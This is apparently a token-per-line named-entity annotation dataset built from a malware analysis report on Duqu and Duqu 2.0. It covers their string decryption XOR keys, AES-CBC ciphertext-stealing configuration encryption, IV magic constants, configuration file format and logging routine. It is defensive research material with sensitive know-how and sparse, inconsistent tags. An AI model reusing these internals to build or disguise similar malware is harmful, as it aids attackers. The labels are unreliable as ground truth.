the	O
first	O
4	O
bytes	O
of	O
the	O
cleartext	O
string	O
.	O
If	O
the	O
first	O
two	O
bytes	O
(	O
first	O
WORD	O
)	O
of	O
the	O
current	O
value	O
stored	O
in	O
variable	O
"	O
result	O
"	O
contain	O
'	O
\0	O
'	O
characters	O
,	O
the	O
original	O
cleartext	O
string	O
was	O
an	O
empty	O
string	O
and	O
the	O
resulting	O
output	O
buffer	O
will	O
be	O
populated	O
by	O
a	O
zero	O
value	O
,	O
stored	O
on	O
2	O
bytes	O
.	O
If	O
the	O
first	O
half	O
of	O
the	O
actual	O
decrypted	O
block	O
(	O
"	O
result	O
"	O
variable	O
)	O
contains	O
something	O
else	O
,	O
the	O
decryptor	O
routine	O
checks	O
the	O
second	O
half	O
of	O
the	O
block	O
(	O
"	O
if	O
(	O
!	O
*	O
(	O
_	O
WORD	O
*	O
)	O
(	O
a2	O
+	O
2	O
)	O
)	O
")	O
.	O
If	O
this	O
WORD	O
value	O
is	O
NULL	O
,	O
then	O
decryption	O
will	O
be	O
ended	O
and	O
the	O
output	O
buffer	O
will	O
contain	O
only	O
one	O
Unicode	O
character	O
with	O
two	O
closing	O
'	O
\0	O
'	O
bytes	O
.	O
If	O
the	O
first	O
decrypted	O
block	O
doens't	O
contain	O
zero	O
character	O
(	O
generally	O
this	O
is	O
the	O
case	O
)	O
,	O
then	O
the	O
decryption	O
cycle	O
continues	O
with	O
the	O
next	O
4-byte	O
encrypted	O
block	O
.	O
The	O
pointer	O
of	O
the	O
output	O
buffer	O
is	O
incremeted	O
by	O
4	O
bytes	O
to	O
be	O
able	O
to	O
store	O
the	O
next	O
cleartext	O
block	O
(	O
"	O
a2	O
+	O
=	O
4	O
;	O
"	O
)	O
.	O
After	O
that	O
,	O
the	O
following	O
4-byte	O
block	O
of	O
the	O
"	O
ciphertext	O
"	O
will	O
be	O
decrypted	O
with	O
the	O
fixed	O
decryption	O
key	O
(	O
"	O
0x86F186F1	O
"	O
)	O
.	O
The	O
result	O
is	O
then	O
stored	O
within	O
the	O
next	O
4	O
bytes	O
of	O
the	O
output	O
buffer	O
.	O
Now	O
,	O
the	O
output	O
buffer	O
contains	O
2	O
blocks	O
of	O
the	O
cleartext	O
string	O
.	O
The	O
condition	O
of	O
the	O
cycle	O
checks	O
if	O
the	O
decryption	O
reached	O
its	O
end	O
by	O
checking	O
the	O
first	O
half	O
of	O
the	O
current	O
decrypted	O
block	O
.	O
If	O
it	O
did	O
not	O
reached	O
the	O
end	O
,	O
then	O
the	O
cycle	O
continues	O
with	O
the	O
decryption	O
of	O
the	O
next	O
input	O
blocks	O
,	O
as	O
described	O
above	O
.	O
Before	O
the	O
decryption	O
of	O
each	O
4-byte	O
"	O
ciphertext	O
"	O
block	O
,	O
the	O
routine	O
also	O
checks	O
the	O
second	O
half	O
of	O
the	O
previous	O
cleartext	O
block	O
to	O
decide	O
whether	O
the	O
decoded	O
string	O
is	O
ended	O
or	O
not	O
.	O
The	O
original	O
Duqu	O
used	O
a	O
very	O
similar	O
string	O
decryption	O
routine	O
,	O
which	O
we	O
printed	O
in	O
the	O
following	O
figure	O
below	O
.	O
We	O
can	O
see	O
that	O
this	O
routine	O
is	O
an	O
exact	O
copy	O
of	O
the	O
previously	O
discussed	O
routine	O
(	O
variable	O
"	O
a1	O
"	O
is	O
analogous	O
to	O
"	O
encrstr	O
"	O
argument	O
)	O
.	O
The	O
only	O
difference	O
between	O
the	O
Duqu	O
2.0	O
and	O
Duqu	O
string	O
decryptor	O
routines	O
is	O
that	O
the	O
XOR	O
keys	O
differ	O
(	O
in	O
Duqu	O
,	O
the	O
key	O
is"0xB31FB31F	O
"	O
)	O
.	O
We	O
can	O
also	O
see	O
that	O
the	O
decompiled	O
code	O
of	O
Duqu	O
contains	O
the	O
decryptor	O
routine	O
in	O
a	O
more	O
compact	O
manner	O
(	O
within	O
a	O
"	O
for	O
"	O
loop	O
instead	O
of	O
a	O
"	O
while	O
"	O
)	O
,	O
but	O
the	O
two	O
routines	O
are	O
essentially	O
the	O
same	O
.	O
For	O
example	O
,	O
the	O
two	O
boundary	O
checks	O
in	O
the	O
Duqu	O
2.0	O
routine	O
(	O
"	O
if	O
(	O
!	O
*	O
(	O
_	O
WORD	O
*	O
)	O
(	O
a2	O
+	O
2	O
)	O
)	O
"	O
and	O
"	O
while	O
(	O
(	O
_	O
WORD)result	O
)	O
;	O
"	O
)	O
are	O
analogous	O
to	O
the	O
boundary	O
check	O
at	O
the	O
end	O
of	O
the	O
"	O
for	O
"	O
loop	O
in	O
the	O
Duqu	O
routine	O
(	O
"	O
if	O
(	O
!	O
(	O
_	O
WORD)v4	O
||	O
!	O
*	O
(	O
_	O
WORD	O
*	O
)	O
(	O
result	O
+	O
2	O
)	O
)	O
")	O
.	O
Similarly	O
,	O
the	O
increment	O
operation	O
within	O
the	O
head	O
of	O
the	O
for	O
loop	O
in	O
the	O
Duqu	O
sample	O
(	O
"	O
result	O
+	O
=	O
4	O
"	O
)	O
is	O
analogous	O
to	O
the	O
increment	O
operation	O
"	O
a2	O
+	O
=	O
4	O
;	O
"	O
in	O
the	O
Duqu	O
2.0	O
sample	O
.	O
The	O
analyzed	B-Entity
main	I-Entity
module	I-Entity
of	I-Entity
Duqu	I-Entity
2.0	I-Entity
and	I-Entity
also	I-Entity
the	I-Entity
old	I-Entity
Duqu	I-Entity
sample	I-Entity
reads	O
configuration	O
information	O
from	O
a	O
special	B-Entity
file	I-Entity
.	O
This	O
configuration	O
file	O
is	O
encrypted	O
using	O
the	O
AES	O
block	O
cipher	O
in	O
CBC	O
mode	O
with	O
a	O
CTS	O
-	O
like	O
(	O
Ciphertext	O
Stealing	O
)	O
encryption	O
of	O
the	O
last	O
two	O
cleartext	O
blocks	O
.	O
The	O
format	O
of	O
the	O
configuration	O
file	O
will	O
be	O
discussed	O
in	O
details	O
in	O
the	O
next	O
chapter	O
.	O
Before	O
the	O
encryption	O
of	O
the	O
configuration	O
file	O
,	O
an	O
AES	O
wrapper	O
object	O
is	O
created	O
.	O
This	O
C++	O
object	O
represents	O
the	O
context	O
(	O
parameters	O
)	O
of	O
the	O
encryption	O
.	O
Therefore	O
,	O
it	O
also	O
stores	O
the	O
initialization	O
vector	O
(	O
IV	O
)	O
of	O
the	O
encryption	O
,	O
the	O
key	O
of	O
the	O
cipher	O
and	O
the	O
data	O
to	O
be	O
encrypted	O
.	O
The	O
structure	O
of	O
this	O
object	O
's	O
class	O
can	O
be	O
seen	O
in	O
the	O
upper	O
part	O
of	O
the	O
next	O
screenshot	O
.	O
As	O
we	O
can	O
see	O
,	O
the	O
allocated	O
memory	O
area	O
of	O
an	O
instance	O
of	O
the	O
"	O
aeswrapper	O
"	O
structure	O
(	O
class	O
)	O
starts	O
with	O
a	O
16	O
bytes	O
(	O
128	O
bits	O
)	O
IV	O
value	O
(	O
of	O
course	O
,	O
the	O
size	O
of	O
the	O
IV	O
equals	O
the	O
size	O
of	O
an	O
AES	O
input	O
block	O
)	O
.	O
It	O
is	O
followed	O
by	O
a	O
516-byte	O
buffer	O
(	O
or	O
other	O
unused	O
smaller	O
attributes	O
)	O
which	O
can	O
store	O
the	O
encryption	O
key	O
of	O
the	O
AES	O
cipher	O
.	O
Size	O
of	O
this	O
encryption	O
key	O
can	O
be	O
either	O
128	O
,	O
192	O
or	O
256	O
bits	O
(	O
16	O
,	O
24	O
or	O
32	O
bytes	O
)	O
.	O
The	O
last	O
4	O
bytes	O
of	O
the	O
"	O
aeswrapper	O
"	O
structure	O
contains	O
the	O
pointer	O
to	O
the	O
data	O
to	O
be	O
encrypted	O
.	O
In	O
addition	O
to	O
the	O
attributes	O
(	O
IV	O
,	O
encryption	O
key	O
,	O
pointer	O
to	O
a	O
data	O
buffer	O
)	O
,	O
the	O
"	O
aeswrapper	O
"	O
class	O
also	O
contains	O
methods	O
.	O
The	O
most	O
important	O
methods	O
are	O
the	O
"	O
encrypt	O
"	O
and	O
"	O
initialize	O
"	O
functions	O
.	O
As	O
the	O
name	O
shows	O
,	O
the	O
initialize	O
method	O
initializes	O
the	O
context	O
(	O
parameters	O
)	O
of	O
the	O
encryption	O
,	O
therefore	O
it	O
sets	O
the	O
IV	O
,	O
key	O
and	O
data	O
members	O
of	O
the	O
"	O
aeswrapper	O
"	O
object	O
.	O
The	O
IV	O
is	O
generated	O
by	O
"	O
hand	O
"	O
,	O
but	O
the	O
key	O
is	O
prepared	O
from	O
an	O
initial	O
key	O
using	O
the	O
prepare_key	O
function	O
.	O
The	O
encrypt	O
method	O
encrypts	O
the	O
data	O
in	O
the	O
modified	O
CBC	O
-	O
CTS-	O
like	O
mode	O
.	O
The	O
method	O
uses	O
an	O
AES	O
encryptor	O
function	O
.	O
The	O
nth_block	O
method	O
of	O
the	O
class	O
gives	O
back	O
a	O
pointer	O
to	O
the	O
n	O
-	O
th	O
block	O
of	O
the	O
data	O
to	O
be	O
encrypted	O
.	O
Finally	O
,	O
the	O
"	O
aeswrapper	O
"	O
class	O
uses	O
the	O
last_block	O
function	O
to	O
perform	O
the	O
CTS	O
-	O
like	O
encryption	O
mechanism	O
at	O
the	O
end	O
.	O
The	O
function	O
gives	O
back	O
a	O
pointer	O
not	O
to	O
the	O
last	O
partial	O
(	O
smaller	O
than	O
16	O
bytes	O
)	O
input	O
block	O
,	O
but	O
to	O
the	O
last	O
16	O
bytes	O
of	O
the	O
input	O
data	O
buffer	O
.	O
The	O
implementation	O
of	O
AES	O
prepare_key	O
and	O
encrypt	O
methods	O
are	O
presumably	O
copied	O
from	O
function	O
libraries	O
.	O
The	O
figure	O
above	O
shows	O
the	O
structures	O
(	O
structures	O
of	O
class	O
instances	O
)	O
which	O
we	O
identified	O
and	O
which	O
are	O
related	O
to	O
the	O
encryption	O
routine	O
and	O
the	O
AES	O
initialization	O
,	O
and	O
the	O
putative	O
attributes	O
of	O
these	O
structures	O
(	O
classes	O
)	O
.	O
Using	O
these	O
structures	O
,	O
the	O
disassembled	O
code	O
can	O
be	O
more	O
readable	O
.	O
There	O
is	O
another	O
structure	O
in	O
addition	O
to	O
the	O
"	O
aeswrapper	O
"	O
class	O
called	O
"	O
aes	O
"	O
on	O
the	O
screenshot	O
above	O
.	O
An	O
instance	O
of	O
this	O
class	O
represents	O
an	O
AES	O
encryptor	O
object	O
.	O
It	O
has	O
probably	O
3	O
attributes	O
:	O
key_schedule	O
,	O
precomputed	O
and	O
iteration_count	O
.	O
In	O
the	O
following	O
table	O
,	O
we	O
can	O
see	O
the	O
AES	O
initialization	O
routine	O
(	O
of	O
the	O
configuration	O
file	O
encryption	O
)	O
of	O
the	O
old	O
Duqu	O
(	O
on	O
the	O
left	O
)	O
and	O
the	O
new	O
Duqu	O
2.0	O
sample	O
(	O
on	O
the	O
right	O
)	O
at	O
assembly	O
code	O
level	O
.	O
The	O
decompiled	O
code	O
of	O
the	O
initialization	O
function	O
(	O
for	O
both	O
malware	O
samples	O
)	O
can	O
be	O
seen	O
in	O
figure	O
Sample	O
6	O
.	O
The	O
AES	O
initialization	O
function	O
initializes	O
the	O
mentioned	O
"	O
aeswrapper	O
"	O
object	O
,	O
it	O
sets	O
the	O
data	O
buffer	O
,	O
prepares	O
the	O
encryption	O
key	O
,	O
and	O
finally	O
,	O
generates	O
the	O
IV	O
based	O
on	O
the	O
magic	O
constant	O
.	O
Duqu	O
"	O
netp	O
"	O
routine	O
Duqu	O
2.0	O
"	O
c7c64	O
"	O
routine	O
In	O
both	O
cases	O
,	O
the	O
highlighted	O
part	O
of	O
the	O
assembly	O
code	O
corresponds	O
to	O
the	O
highlighted	O
part	O
of	O
the	O
initialization	O
routines	O
in	O
the	O
decompiled	O
versions	O
of	O
the	O
code	O
,	O
which	O
can	O
be	O
seen	O
in	O
figure	O
Sample	O
6	O
.	O
The	O
only	O
difference	O
between	O
the	O
highlighted	O
parts	O
is	O
the	O
values	O
of	O
the	O
magic	O
constants	O
(	O
"	O
0xDEADBABE	O
"	O
vs.	O
"	O
0x248561EF	O
"	O
)	O
which	O
are	O
used	O
for	O
the	O
generation	O
of	O
the	O
128-bit	O
initialization	O
vectors	O
.	O
The	O
mentioned	O
AES	O
initialization	O
routines	O
(	O
and	O
also	O
the	O
common	O
encryption	O
function	O
)	O
will	O
be	O
discussed	O
later	O
in	O
this	O
section	O
in	O
more	O
details	O
.	O
We	O
also	O
reverse	O
engineered	O
the	O
encryption	O
routine	O
used	O
by	O
Duqu	O
2.0	O
,	O
which	O
is	O
illustrated	O
in	O
the	O
following	O
block	O
diagram	O
.	O
With	O
the	O
exception	O
of	O
the	O
last	O
two	O
input	O
blocks	O
,	O
consecutive	O
blocks	O
of	O
the	O
cleartext	O
data	O
are	O
encrypted	O
with	O
the	O
AES	O
encryption	O
algorithm	O
in	O
CBC	O
mode	O
.	O
Accordingly	O
,	O
the	O
first	O
block	O
of	O
the	O
input	O
data	O
(	O
"	O
P[0	O
]	O
"	O
)	O
is	O
XORed	O
with	O
a	O
fixed	O
initialization	O
vector	O
(	O
named	O
as	O
"	O
Fixed	O
IV	O
"	O
in	O
the	O
figure	O
above	O
)	O
.	O
This	O
128-bit	O
initialization	O
vector	O
(	O
IV	O
)	O
differs	O
between	O
the	O
old	O
Duqu	O
and	O
the	O
new	O
Duqu	O
2.0	O
samples	O
.	O
The	O
value	O
of	O
this	O
IV	O
is	O
generated	O
from	O
a	O
magic	O
constant	O
,	O
as	O
it	O
can	O
be	O
seen	O
in	O
the	O
highlighted	O
parts	O
of	O
the	O
previous	O
assembly	O
code	O
.	O
As	O
this	O
magic	O
constant	O
is	O
different	O
in	O
the	O
old	O
and	O
new	O
samples	O
,	O
the	O
generated	O
IV	O
will	O
also	O
be	O
different	O
.	O
The	O
result	O
of	O
the	O
previously	O
mentioned	O
XOR	O
operation	O
gives	O
the	O
first	O
input	O
block	O
of	O
the	O
AES	O
encryption	O
algorithm	O
(	O
"	O
AES-256	O
"	O
is	O
in	O
use	O
)	O
.	O
The	O
number	O
256	O
means	O
that	O
the	O
AES	O
algorithm	O
has	O
256-bit	O
key	O
size	O
.	O
The	O
block	O
size	O
of	O
the	O
AES	O
cipher	O
is	O
constant	O
128	O
bits	O
(	O
16	O
bytes	O
)	O
.	O
"	O
E[0	O
]	O
"	O
is	O
the	O
first	O
output	O
of	O
the	O
block	O
cipher	O
,	O
so	O
it	O
will	O
be	O
the	O
first	O
encrypted	O
block	O
(	O
"	O
F[0	O
]	O
"	O
)	O
.	O
Output	O
of	O
the	O
block	O
cipher	O
(	O
"	O
E[0	O
]	O
"	O
)	O
is	O
then	O
XORed	O
with	O
the	O
second	O
input	O
block	O
(	O
"	O
P[1	O
]	O
"	O
)	O
,	O
and	O
the	O
resulting	O
block	O
will	O
be	O
encrypted	O
with	O
AES-256	O
.	O
This	O
procedure	O
continues	O
until	O
the	O
encryption	O
of	O
the	O
last	O
but	O
first	O
block	O
of	O
the	O
cleartext	O
data	O
.	O
If	O
the	O
size	O
of	O
the	O
input	O
data	O
is	O
an	O
integer	O
multiple	O
of	O
the	O
block	O
size	O
of	O
AES	O
(	O
i.e.	O
,	O
128	O
bits	O
)	O
,	O
then	O
the	O
remaining	O
last	O
two	O
blocks	O
of	O
the	O
cleartext	O
are	O
encrypted	O
in	O
the	O
same	O
manner	O
as	O
the	O
previous	O
input	O
blocks	O
.	O
So	O
,	O
in	O
this	O
case	O
,	O
the	O
whole	O
encryption	O
routine	O
matches	O
a	O
simple	O
CBC	O
mode	O
encryption	O
.	O
However	O
,	O
if	O
the	O
size	O
of	O
the	O
input	O
data	O
is	O
not	O
an	O
exact	O
multiple	O
of	O
the	O
AES	O
block	O
size	O
,	O
the	O
last	O
partial	O
block	O
of	O
the	O
input	O
data	O
needs	O
padding	O
to	O
be	O
completed	O
to	O
a	O
full	O
block	O
.	O
In	O
case	O
of	O
Duqu	O
2.0	O
,	O
the	O
developers	O
of	O
the	O
malware	O
did	O
n't	O
use	O
padding	O
in	O
a	O
traditional	O
way	O
.	O
Instead	O
,	O
they	O
use	O
a	O
CTS	O
-	O
like	O
(	O
Ciphertext	O
Stealing	O
)	O
method	O
.	O
The	O
essence	O
of	O
the	O
method	O
used	O
by	O
the	O
encryption	O
routine	O
is	O
that	O
a	O
part	O
of	O
the	O
last	O
but	O
first	O
block	O
of	O
the	O
input	O
data	O
is	O
encrypted	O
twice	O
using	O
AES	O
.	O
The	O
last	O
but	O
first	O
block	O
(	O
"	O
P[n-1	O
]	O
"	O
)	O
of	O
the	O
cleartext	O
data	O
is	O
XORed	O
with	O
the	O
previous	O
ciphertext	O
block	O
(	O
"	O
E[n-2	O
]	O
"	O
)	O
and	O
encrypted	O
with	O
AES-256	O
as	O
previously	O
.	O
The	O
result	O
of	O
this	O
operation	O
is	O
the	O
"	O
E[n-1	O
]	O
"	O
output	O
block	O
.	O
The	O
"	O
E[n-1	O
]	O
"	O
output	O
block	O
wo	O
n't	O
be	O
directly	O
used	O
as	O
the	O
(	O
n-1)st	O
ciphertext	O
block	O
.	O
Instead	O
,	O
the	O
output	O
"	O
E[n-1	O
]	O
"	O
is	O
splitted	O
into	O
two	O
distinct	O
parts	O
:	O
"	O
F[n-1	O
]	O
"	O
and	O
another	O
part	O
which	O
is	O
then	O
fed	O
into	O
the	O
AES	O
encryptor	O
again	O
.	O
The	O
last	O
cleartext	O
partial	O
block	O
(	O
"	O
P[n	O
]	O
"	O
)	O
–	O
which	O
has	O
size	O
less	O
than	O
16	O
bytes	O
–	O
is	O
completed	O
from	O
its	O
beginning	O
to	O
get	O
a	O
full	O
AES	O
input	O
block	O
.	O
The	O
data	O
used	O
for	O
completing	O
the	O
last	O
partial	O
block	O
is	O
taken	O
from	O
the	O
end	O
of	O
the	O
previous	O
AES	O
output	O
block	O
(	O
"	O
E[n-1	O
]	O
"	O
)	O
.	O
The	O
resulting	O
block	O
will	O
be	O
fed	O
into	O
the	O
AES-256	O
cipher	O
in	O
the	O
last	O
step	O
of	O
the	O
encryption	O
process	O
.	O
The	O
output	O
of	O
the	O
last	O
invocation	O
of	O
the	O
AES	O
cipher	O
will	O
be	O
the	O
last	O
ciphertext	O
block	O
(	O
"	O
F[n	O
]	O
"	O
)	O
.	O
The	O
output	O
of	O
the	O
last	O
but	O
first	O
invocation	O
of	O
the	O
AES	O
encryptor	O
(	O
"	O
E[n-1	O
]	O
"	O
)	O
is	O
split	O
into	O
two	O
parts	O
,	O
and	O
the	O
first	O
part	O
of	O
size	O
size_of_the_last_cleartext_block	O
will	O
be	O
the	O
(	O
n-1)st	O
ciphertext	O
block	O
(	O
"	O
F[n-	O
1	O
]	O
"	O
)	O
.	O
The	O
old	O
Duqu	O
samples	O
used	O
exactly	O
the	O
same	O
encryption	O
method	O
.	O
The	O
decompiled	O
code	O
of	O
the	O
AES	O
encryptor	O
of	O
Duqu	O
can	O
be	O
seen	O
in	O
the	O
following	O
sample	O
,	O
and	O
one	O
can	O
see	O
that	O
this	O
code	O
implements	O
the	O
method	O
we	O
have	O
just	O
explained	O
and	O
illustrated	O
in	O
the	O
block	O
diagram	O
of	O
Figure	O
8	O
.	O
The	O
next	O
table	O
compares	O
the	O
AES	O
initialization	O
routines	O
of	O
the	O
old	O
Duqu	O
sample	O
(	O
upper	O
part	O
of	O
the	O
table	O
)	O
and	O
the	O
main	O
module	O
of	O
Duqu	O
2.0	O
(	O
lower	O
part	O
of	O
the	O
table	O
)	O
.	O
First	O
,	O
the	O
initialization	O
routine	O
copies	O
the	O
pointer	O
of	O
the	O
input	O
data	O
buffer	O
into	O
the	O
"	O
data	O
"	O
member	O
of	O
the	O
"	O
aeswrapper	O
"	O
object	O
.	O
The	O
routine	O
takes	O
this	O
pointer	O
as	O
its	O
second	O
parameter	O
.	O
The	O
first	O
parameter	O
is	O
the	O
pointer	O
(	O
reference	O
)	O
of	O
the	O
object	O
instance	O
,	O
since	O
in	O
C++	O
,	O
the	O
first	O
(	O
hidden	O
)	O
parameter	O
of	O
a	O
(	O
non	O
-	O
static	O
)	O
class	O
method	O
is	O
always	O
the	O
pointer	O
of	O
the	O
object	O
,	O
or	O
in	O
other	O
words	O
,	O
the	O
"	O
this	O
"	O
pointer	O
.	O
In	O
case	O
of	O
Duqu	O
2.0	O
,	O
the	O
routine	O
has	O
a	O
third	O
parameter	O
,	O
the	O
pointer	O
to	O
the	O
buffer	O
containing	O
the	O
key	O
.	O
After	O
that	O
,	O
the	O
content	O
of	O
the	O
"	O
key	O
"	O
buffer	O
(	O
which	O
is	O
a	O
global	O
buffer	O
in	O
the	O
first	O
case	O
)	O
is	O
copied	O
into	O
the	O
local	O
"	O
key	O
_	O
"	O
buffer	O
in	O
both	O
cases	O
.	O
Then	O
the	O
prepare_key	O
method	O
of	O
the	O
AES	O
object	O
prepares	O
the	O
final	O
encryption	O
key	O
based	O
on	O
this	O
key	O
,	O
and	O
feeds	O
it	O
into	O
the	O
"	O
aeswrapper	O
"	O
object	O
.	O
Invocation	O
of	O
the	O
prepare_key	O
method	O
can	O
also	O
be	O
seen	O
in	O
the	O
assembly	O
view	O
(	O
see	O
Sample	O
4	O
.	O
)	O
,	O
the	O
method	O
is	O
referred	O
by	O
the	O
name	O
AES1_sub_2F9B1	O
in	O
case	O
of	O
Duqu	O
and	O
AES_1_sub_1001690A	O
in	O
case	O
of	O
Duqu	O
2.0	O
.	O
In	O
the	O
Duqu	O
2.0	O
case	O
,	O
the	O
function	O
has	O
one	O
more	O
parameter	O
,	O
as	O
this	O
can	O
also	O
be	O
seen	O
in	O
the	O
assembly	O
view	O
,	O
and	O
the	O
length	O
of	O
the	O
AES	O
key	O
is	O
chosen	O
as	O
256	O
bits	O
.	O
Finally	O
,	O
the	O
remaining	O
part	O
of	O
the	O
code	O
initializes	O
the	O
IV	O
member	O
of	O
"	O
aeswrapper	O
"	O
object	O
.	O
Every	O
byte	O
of	O
the	O
IV	O
is	O
generated	O
by	O
XORing	O
the	O
index	O
of	O
the	O
actual	O
byte	O
with	O
a	O
magic	O
constant	O
(	O
"	O
0xDEADBABE	O
"	O
and	O
"	O
0x248561EF	O
"	O
,	O
respectively	O
,	O
in	O
the	O
two	O
cases	O
)	O
.	O
Byte	O
index	O
starts	O
from	O
zero	O
.	O
As	O
we	O
can	O
see	O
,	O
there	O
are	O
only	O
three	O
small	O
differences	O
between	O
the	O
routines	O
:	O
the	O
magic	O
constants	O
used	O
by	O
the	O
IV	O
generation	O
,	O
the	O
fact	O
that	O
in	O
Duqu	O
the	O
key	O
is	O
a	O
constant	O
global	O
variable	O
with	O
fixed	O
value	O
while	O
in	O
Duqu	O
2.0	O
it	O
is	O
an	O
argument	O
of	O
the	O
initialization	O
function	O
,	O
and	O
finally	O
,	O
the	O
possible	O
length	O
of	O
the	O
key	O
.	O
In	O
case	O
of	O
Duqu	O
,	O
the	O
prepare_key	O
function	O
assumes	O
that	O
the	O
key	O
is	O
always	O
256	O
bits	O
,	O
while	O
in	O
case	O
of	O
Duqu	O
2.0	O
,	O
the	O
prepare_key	O
function	O
takes	O
the	O
key	O
length	O
as	O
an	O
argument	O
.	O
Key	O
length	O
can	O
be	O
128	O
,	O
192	O
or	O
256	O
bits	O
.	O
Under	O
the	O
encryption	O
layer	O
(	O
which	O
is	O
identical	O
in	O
the	O
new	O
and	O
old	O
samples	O
as	O
described	O
in	O
the	O
previous	O
section	O
)	O
,	O
the	O
configuration	O
file	O
format	O
of	O
the	O
new	O
Duqu	O
2.0	O
samples	O
is	O
very	O
similar	O
to	O
the	O
old	O
Duqu	O
config	O
file	O
format	O
.	O
For	O
an	O
overview	O
,	O
see	O
Figure	O
5	O
below	O
.	O
The	O
format	O
is	O
designed	O
to	O
hold	O
key	O
-	O
value	O
pairs	O
.	O
The	O
keys	O
are	O
always	O
4-byte	O
long	O
,	O
and	O
the	O
values	O
can	O
be	O
of	O
arbitrary	O
size	O
.	O
We	O
believe	O
that	O
the	O
keys	O
are	O
timestamps	O
and	O
the	O
values	O
are	O
configuration	O
entries	O
,	O
although	O
the	O
file	O
format	O
could	O
hold	O
any	O
other	O
similarly	O
structured	O
information	O
(	O
e.g.	O
configurations	O
)	O
.	O
The	O
old	O
file	O
format	O
begins	O
with	O
4	O
bytes	O
whose	O
value	O
is	O
undefined	O
.	O
In	O
the	O
serialization	O
process	O
,	O
it	O
is	O
read	O
from	O
an	O
uninitialized	O
buffer	O
,	O
and	O
it	O
is	O
ignored	O
in	O
the	O
deserialization	O
process	O
.	O
The	O
new	O
file	O
format	O
does	O
not	O
have	O
such	O
a	O
beginning	O
byte	O
sequence	O
.	O
The	O
main	O
part	O
of	O
the	O
file	O
format	O
is	O
surrounded	O
by	O
4	O
signature	O
bytes	O
at	O
the	O
beginning	O
and	O
at	O
the	O
end	O
.	O
The	O
byte	O
sequence	O
in	O
the	O
old	O
Duqu	O
file	O
format	O
is	O
0x839172FF	O
,	O
and	O
in	O
the	O
new	O
Duqu	O
2.0	O
version	O
,	O
it	O
is	O
0x7749CB4D.	O
In	O
both	O
cases	O
,	O
the	O
next	O
integer	O
indicates	O
the	O
number	O
of	O
entries	O
,	O
followed	O
by	O
the	O
entries	O
themselves	O
.	O
Each	O
entry	O
begins	O
with	O
a	O
4-byte	O
key	O
,	O
and	O
then	O
the	O
value	O
.	O
In	O
the	O
new	O
format	O
,	O
the	O
value	O
always	O
begins	O
with	O
13	O
bytes	O
(	O
that	O
can	O
be	O
logically	O
divided	O
into	O
four	O
4	O
byte	O
integers	O
and	O
a	O
1	O
byte	O
value	O
:	O
4	O
+	O
4	O
+	O
1	O
+	O
4	O
+	O
4	O
)	O
,	O
but	O
in	O
the	O
old	O
format	O
,	O
this	O
is	O
missing	O
.	O
Furthermore	O
,	O
the	O
value	O
contains	O
a	O
variable	O
size	O
part	O
in	O
both	O
formats	O
.	O
This	O
is	O
a	O
length	O
prefixed	O
buffer	O
that	O
can	O
hold	O
arbitrary	O
data	O
.	O
In	O
essence	O
,	O
the	O
only	O
difference	O
between	O
the	O
Duqu	O
and	O
the	O
Duqu	O
2.0	O
config	O
file	O
formats	O
is	O
the	O
presence	O
of	O
the	O
undefined	O
4	O
bytes	O
at	O
the	O
beginning	O
of	O
the	O
file	O
in	O
the	O
old	O
version	O
,	O
and	O
the	O
presence	O
of	O
the	O
13	O
additional	O
value	O
bytes	O
in	O
the	O
new	O
version	O
.	O
We	O
've	O
identified	O
a	B-Entity
characteristic	I-Entity
logging	I-Entity
function	I-Entity
that	O
is	O
present	O
in	O
both	O
Duqu	O
and	O
Duqu	O
2.0	O
,	O
and	O
is	B-Action
used	I-Action
extensively	B-Entity
in	O
the	O
networking	B-Entity
(	I-Entity
mainly	I-Entity
HTTP	I-Entity
handling	I-Entity
)	I-Entity
part	I-Entity
of	I-Entity
the	I-Entity
code	I-Entity
.	O
The	O
logging	O
function	O
itself	O
is	O
identical	O
,	O
and	O
the	O
data	O
structure	O
used	O
for	O
storing	O
log	O
entries	O
is	O
very	O
similar	O
.	O
The	O
Duqu	O
version	O
of	O
the	O
data	O
structure	O
has	O
embedded	O
function	O
pointers	O
,	O
while	O
the	O
Duqu	O
2.0	O
version	O
uses	O
a	O
virtual	O
function	O
table	O
like	O
structure	O
.	O
The	O
main	O
difference	O
from	O
a	O
C++	O
virtual	O
function	O
table	O
is	O
that	O
the	O
pointer	O
to	O
the	O
table	O
is	O
the	O
last	O
field	O
of	O
the	O
associated	O
structure	O
instead	O
of	O
the	O
first	O
field	O
(	O
see	O
Figure	O
6	O
)	O
.	O
In	O
general	O
,	O
change	O
in	O
the	O
coding	O
style	O
can	O
be	O
seen	O
all	O
over	O
the	O
code	O
.	O
While	O
Duqu	O
uses	O
object	O
oriented	O
style	O
that	O
is	O
similar	O
,	O
but	O
not	O
identical	O
to	O
what	O
C++	O
compilers	O
do	O
,	O
Duqu	O
2.0	O
moved	O
mainly	O
to	O
"	O
real	O
"	O
C++	O
,	O
but	O
there	O
are	O
still	O
deviations	O
from	O
the	O
standard	O
C++	O
style	O
(	O
like	O
the	O
previously	O
function	O
table	O
)	O
.	O
Both	O
the	O
Duqu	O
and	O
Duqu	O
2.0	O
avoids	O
storing	O
the	O
messages	O
logged	O
through	O
this	O
function	O
.	O
In	O
both	O
codebase	O
,	O
a	O
"	O
handle_log_entry	O
"	O
function	O
is	O
called	O
after	O
creating	O
the	O
log	O
entry	O
structure	O
,	O
but	O
this	O
function	O
throws	O
the	O
object	O
away	O
(	O
frees	O
the	O
memory	O
)	O
and	O
does	O
not	O
print	O
or	O
save	O
it	O
.	O
The	O
authors	O
probably	O
used	O
C	O
/	O
C++	O
macros	O
to	O
avoid	O
detailed	O
logging	O
in	O
release	O
builds	O
,	O
but	O
in	O
this	O
case	O
we	O
still	O
see	O
the	O
logging	O
function	O
invocation	O
.	O
In	O
this	O
case	O
,	O
the	O
macro	O
was	O
probably	O
placed	O
in	O
the	O
function	O
that	O
should	O
have	O
printed	O
the	O
log	O
message	O
(	O
handle_log_entry	O
)	O
,	O
and	O
since	O
this	O
is	O
a	O
virtual	O
function	O
,	O
the	O
compiler	O
could	O
not	O
optimize	O
out	O
the	O
function	O
invocations	O
directly	O
.	O
The	O
logging	O
function	O
is	O
called	O
equal	O
times	O
in	O
the	O
Duqu	O
and	O
the	O
Duqu	O
2.0	O
samples	O
,	O
and	O
the	O
invocation	O
is	O
always	O
very	O
similar	O
(	O
see	O
Figure	O
7	O
)	O
.	O
The	O
arguments	O
are	O
usually	O
not	O
strings	O
describing	O
the	O
event	O
directly	O
,	O
but	O
4	O
byte	O
magic	O
numbers	O
.	O
The	O
logging	O
function	O
is	O
invoked	O
equal	O
times	O
,	O
and	O
the	O
magic	O
numbers	O
are	O
almost	O
always	O
identical	O
in	O
Duqu	O
and	O
Duqu	O
2.0	O
